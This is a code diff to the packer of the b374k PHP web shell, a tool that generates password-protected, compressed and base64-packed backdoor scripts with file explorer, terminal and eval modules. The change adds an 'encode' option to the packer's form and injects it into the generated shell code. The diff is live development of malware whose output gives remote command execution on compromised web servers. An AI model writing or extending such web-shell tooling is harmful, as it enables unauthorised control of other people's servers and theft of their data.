@@ -78,7 +78,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		eval($content);
 		die();
 	}
-	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])){
+	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
 		$outputfile = trim($p['outputfile']);
 		if(empty($outputfile)) $outputfile = 'b374k.php';
 		$password = trim($p['password']);
@@ -90,6 +90,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$base64 = trim($p['base64']);
 		$compress = trim($p['compress']);
 		$compress_level = (int) $p['compress_level'];
+		$encode = addslashes(trim($p['encode']));
 
 		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
 
@@ -117,7 +118,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 
 		$htmlcode = trim($layout);
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
-		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
+		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
 		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
 	}
@@ -200,6 +201,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 					<option selected="selected">9</option>
 				</select>
 			</td></tr>
+			<tr><td style='width:220px;'>Encode</td><td><input id='encode' type='text' value='utf-8'></td></tr>
 
 			<tr><td colspan='2'>
 				<span class='button' id='packGo'>Pack</span>
@@ -238,8 +240,9 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			base64 = $('#base64').val();
 			compress = $('#compress').val();
 			compress_level = $('#compress_level').val();
+			encode = $('#encode').val();
 
-			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level}, function(res){
+			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode}, function(res){
 				splits = res.split('{[|b374k|]}');
 				$('#resultContent').html(splits[1]);
 				$('#result').html(splits[0]);
